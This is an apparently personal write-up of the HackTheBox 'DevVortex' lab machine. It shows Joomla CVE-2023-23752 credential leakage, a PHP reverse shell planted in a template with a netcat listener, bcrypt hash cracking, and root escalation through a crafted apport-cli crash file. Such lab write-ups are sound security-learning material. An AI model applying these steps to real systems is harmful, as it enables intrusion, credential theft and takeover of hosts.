---
pub: true
title: "DevVortex"
link: "https://www.hackthebox.com/machines/devvortex"
description: "Easy HackTheBox seasonal machine."
from: "hackthebox"
date: "2024-02-08"
type: "ctf"
tags: ["web"]
---

# DevVortex

<aside>
<a href={link}>{title} @ {from}</a><br/>
Another easy HackTheBox machine demonstrating some vulnerabilities with readily-accessible proof-of-concept exploits.
</aside>

## Recon/enumeration

Running `rustscan` to enumerate for open ports, we’re given an `nginx` service on port 80 and an `ssh` service on port 22.

```
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

SSH access is denied without proper credentials (Anonymous login is disallowed, as is the default for SSH), and there is nothing to find of particular interest on the webpage itself;
I used `feroxbuster` (a CLI tool for brute-forcing directories and file locations) to perform directory enumeration, though this turned up nothing of interest.
I also re-ran port scans as sometimes `rustscan` can return false negatives on account of its speed, but there was really nothing to further.
Finally, I checked out the handfull of `nginx v1.18.0` vulnerabilities with public proof-of-concept exploits, though nothing proved useful.

HTB often makes use of virtual hosts/subdomains to hide away CMS admin dashboards. We can call it "being thorough" in retrospect, though truthfully I just wasn't overly keen on having to enumerate for subdomains (mostly just because I will
have to do even more work in order to learn a tool or write and debug a script - sunk-cost fallacy or whatever). Having now exhausted most other options, though, I might as well bite the bullet; I wrote the following Python script to pull common
subdomain names from a SecLists subdomain wordlist and insert it into the `Host` header of a HTTP GET request. This is essentially like adding the subdomain URL and IP into our `/etc/hosts` for each subdomain - we are directing our DNS to resolve
the domain specified in the `Host` header to the IP specified in the URL.

It might also be handy to have a simple single-purpose CLI tool for this, so I ~~want to rewrite this in Rust at some point~~ [rewrote it in Rust](https://github.com/plsuwu/vhost-enum)
(it still needs some work).

```python
#!/usr/bin/env python

import os
import requests

IP = "10.10.11.242"
host_list: list[str] = (open(
    "/home/please/git/red_tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt")
                        .read()
                        .strip()
                        .split("\\n")
    )


for host in host_list:
    headers: dict[str, str] = {"Host": f"{host}.devvortex.htb"}
    try:
        res = requests.get(f"http://{IP}/", headers=headers)
        if res.status_code == 200:
            print(f"{host}.devvortex.htb seems up")

    # continue to run script if we are redirected back to the root page
    except requests.exceptions.TooManyRedirects as err:
        print(f"exception ({err}): on virthost {host}.devvortex.htb")
        continue

    # ignore this error, which is due to my internet dropping out
    except requests.exceptions.ConnectionError as err:
        print(f"exception ({err}): on virthost {host}.devvortex.htb")
        continue

```

The script only makes it like 10 requests in before we get a valid response for a subdomain with a 200 status - `dev.devvortex.htb`.

```
[...]

exception (Exceeded 30 redirects.): on virthost m.devvortex.htb
exception (Exceeded 30 redirects.): on virthost blog.devvortex.htb
dev.devvortex.htb seems up
exception (Exceeded 30 redirects.): on virthost www2.devvortex.htb

[...]
```

Once again, there’s nothing to be seen on the landing page, but we get some interesting results when we run `feroxbuster` on this subdomain:

```
$ feroxbuster --url <http://dev.devvortex.htb/> --smart -t 20 -w ~/git/red_tools/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o ferox-dev_subd.log --redirects -C 404

200      GET        1l        2w       31c <http://dev.devvortex.htb/modules/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/images/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/cache/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/language/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/components/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/plugins/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/tmp/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/templates/>
200      GET        1l        2w       31c <http://dev.devvortex.htb/includes/>

[...]
```

This scan winds up returning an `/administrator/` endpoint, which is always very interesting. The contents of this endpoint indicate the web application is running a Joomla! CMS under the hood:

![Untitled](/img/devvortex_img/Untitled.png)

This means we can run `droopescan` to gather some more information; we know the server is running Joomla! version `4.2.6`, as indicated by the document at the
`/administrator/manifests/files/joomla.xml` endpoint:

```bash
$ ./droopescan scan joomla --url <http://dev.devvortex.htb>                                                                                                                                                       ✭
[+] No version found.

[+] Possible interesting urls found:
    Detailed version information. - <http://dev.devvortex.htb/administrator/manifests/files/joomla.xml>
    Login page. - <http://dev.devvortex.htb/administrator/>
    License file. - <http://dev.devvortex.htb/LICENSE.txt>
    Version attribute contains approx version - <http://dev.devvortex.htb/plugins/system/cache/cache.xml>

[+] Scan finished (0:00:00.860053 elapsed)
```

## Initial SSH access

This Joomla! version is susceptible to CVE-2023-23752, an unauthenticated information disclosure vulnerability, allowing unauthorized access to sensitive information. We can exploit this to gain
access to the CMS as a superuser with `lewis@devvortex.htb`'s credentials:

```bash
$ ruby exploit.rb <http://dev.devvortex.htb>
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

> Also taking note of the reference to a `mysql` DB.

At this point, I kept getting the following error, alongside repeated invalidation of my session cookie and being kicked out of the CMS:

![Untitled](/img/devvortex_img/Untitled%201.png)

As this issue was persistent through VM instance resets, I thought this was part of the box (it wasn’t) so I wound up losing a lot of time.
Ultimately, I had to swap HTB server regions before I could continue as intended.

Faulty machines aside, we can write malicious PHP to one of the template files - this is similar to other CMS backends like `Wordpress`, which will allows us to execute arbitrary code very
easily; in this case, we can use the classic PentestMonkey PHP reverse shell script, replacing the network info with our local IP and favorite port. We can then write it to the template file,
start up a netcat listener, and finally, make a GET request for `http://dev.devvortex.htb/templates/cassiopeia/error.php` to execute the script, initiating the remote machine to call back
to our local `netcat` listener.

![Untitled](/img/devvortex_img/Untitled%202.png)

To improve our shell interaction, we can execute a series of commands to upgrade from a basic shell session to a fully interactive tty terminal - this is more a matter of convenience than necessity, but it allows
us to, for example, hit `<C-c>` to send `SIGINT` to a process on the remote machine, rather than `SIGINT`ing our local netcat process. There's a handful of other benefits to this but signal hotkeys are the first thing
I could think of and there's already enough grammar mistakes to fix so I'm picking my battles and moving on.

Regardless, in this instance, we can use a few easy terminal tricks to achieve our `tty`:

- the machine has an available `python3` binary, allowing us to spawn a `pty` with python's built-in `pty` module (this is achieved via the command `python3 -c 'import pty; pty.spawn("/bin/bash")`),
- we further upgrade the python-invoked `pty` to a fully interactive `tty` by copying over some of our terminal environment, essentially allowing us to send our raw, untransformed input directly to the remote session.

The following output is a little bit messy, but the general idea outlined above is (hopefully) visible:

```bash
\[pls@ruby\]:\[~\] \$ nc -lnvp 9999                                                                                                                             130 ↵
Listening on 0.0.0.0 9999

Connection received on 10.129.45.143 39578
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 13:46:45 up 53 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can\'t access tty; job control turned off

$ whoami
www-data
\$ echo $TERM
\$ which python
\$ which python3
/usr/bin/python3
\$ python3 -c 'import pty; pty.spawn("/bin/bash")'
\www-data@devvortex:/\$ echo $TERM
echo $TERM
dumb
\www-data@devvortex:/\$ ^Z
\[1\]  + 219973 suspended  nc -lnvp 9999

\[please@ruby\]:\[~\] \$ echo $TERM; stty -a                                                                                                                       148 ↵
tmux-256color
speed 38400 baud; rows 74; columns 164; line = 0;
intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
\[please@ruby\]:\[~\] \$ stty raw -echo;fg

[1]  + 219973 continued  nc -lnvp 9999
                                      reset
reset: unknown terminal type unknown
Terminal type? tmux-256color
\www-data@devvortex:/\$ export SHELL=zsh
\www-data@devvortex:/\$ export TERM=tmux-256color
\www-data@devvortex:/\$ stty rows 74 columns 164
```

`cat`ing out `/etc/passwd`, we see that there are two users with login shells - `root` and `logan`, alongside a `MySQL` user that might be useful should we require credentials.

```bash
www-data@devvortex:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash

[...]

mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
logan:x:1000:1000:,,,:/home/logan:/bin/bash
```
> spoiler we do need credentials we need them you'll see in literally two lines

## Privilege escalation | User

Changing directory to `/home/logan`, the flag in `user.txt` isn't readable to us as `www-data`.

```bash
www-data@devvortex:/home/logan$ ls -la
total 28
[...]
-rw-r----- 1 root  logan   33 Feb  5 12:53 user.txt
```

Recalling the information scraped from the vulnerable Joomla! service, we can log into the `mysql` database as `lewis`:

```bash
www-data@devvortex:/home/logan$ mysql --user=lewis --password=P4ntherg0t1n5r3c0n## --host=localhost
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \\g.
Your MySQL connection id is 62
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.
```

Running a few SQL commands to focus in on potential account credentials, we are able to print off the `users` table:

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;

# ...

| sd4fg_users                   |

# ...

mysql> select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+--- ...]
| id  | name       | username | email               | password                                                     | bl ...]
+-----+------------+----------+---------------------+--------------------------------------------------------------+--- ...]
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |    ...]
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |    ...]
+-----+------------+----------+---------------------+--------------------------------------------------------------+--- ...]
2 rows in set (0.00 sec)

mysql>
```

The `$2y$10$...` prefix in the values of the `password` column, however, indicates we have some `bcrypt` hashes that we can try to decrypt. I don’t think we really care about the `lewis` user anymore,
so we’ll grab `logan`'s hash and run it through `hashcat` against the classic capture-the-flag wordlist `rockyou.txt`:

```bash
[please@ruby]:[~/Documents/ctfs/htb/devvortex] $ hashcat --help | grep -ie "bcrypt"
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
[please@ruby]:[~/Documents/ctfs/htb/devvortex] $ echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > logan.bcrypt-hash
[please@ruby]:[~/Documents/ctfs/htb/devvortex] $ hashcat -a 0 -m 3200 logan.bcrypt-hash ~/git/red_tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting

# ...

Host memory required for this attack: 843 MB

Dictionary cache built:
* Filename..: /home/please/git/red_tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho

[...]
```

Heading back to the server with plaintext credentials in hand, we can close out of our reverse shell, and login using `logan@<IP>` with `tequieromucho` as the password:

```bash
[please@ruby]:[~] $ ssh logan@10.129.45.143
The authenticity of host '10.129.45.143 (10.129.45.143)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: 10.10.11.242
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.45.143' (ED25519) to the list of known hosts.
logan@10.129.45.143's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

[...]

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$ cat user.txt
a285f0ff772a16a92ae496048f8ec17f
```

We can check `logan`'s `sudoer` entry with `sudo -l`, we know that they’re able to run `apport-cli` as `root`:

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

## Privilege escalation | System root

According to this [proof of concept exploit](https://github.com/DonnchaC/ubuntu-apport-exploitation), viewing a crafted crash log through this version of `apport-cli` can lead to arbitrary code execution.
We can’t just use a random crash log as this must be *crafted* to contain malicious code, but the POC *does* include a `minimal-rce.crash` file that will do the heavy lifting for us.

We can copy/paste its contents into a file on the box and pass it to `apport-cli`, and then execute the binary as `root` using `sudo apport-cli -c ./test.crash`:

```bash
logan@devvortex:~$ vim ./test.crash
logan@devvortex:~$ sudo apport-cli -c ./test.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (0.2 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v

```

Choosing option `V` opens the log in the `apport-cli` report viewer, which seems similar to a Vi or Vi-adjacent editor - we can invoke a `root` shell by simply typing `!bash`, and then `cat` out the
second flag at the usual `/root/root.txt` directory:

```bash
== CrashDB =================================
{'impl': 'memory', 'crash_config': exec("""
import subprocess
payload_cmd = "pkill -9 apport; gnome-calculator"
subprocess.Popen(payload_cmd, shell=True)
""", {}) }

== ExecutablePath =================================
/usr/bin/file-roller

== ProblemType =================================
Bug

== Stacktrace =================================
None

== UnreportableReason =================================
A package hook defines an invalid crash database definition:
{'impl': 'memory', 'crash_config': exec("""
import subprocess
payload_cmd = "pkill -9 apport; gnome-calculator"
subprocess.Popen(payload_cmd, shell=True)
""", {}) }
!bash
```
> This is a little tricky to show without a moving image; if this doesn't really make much sense *visually*, check out [this article](https://donncha.is/2016/12/compromising-ubuntu-desktop/) for
a more in-depth explanation.

```bash
*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

root@devvortex:/home/logan# whoami
root
root@devvortex:/home/logan# cat /root/root.txt
b60647d85778b3db2521377e8ee9038d
```
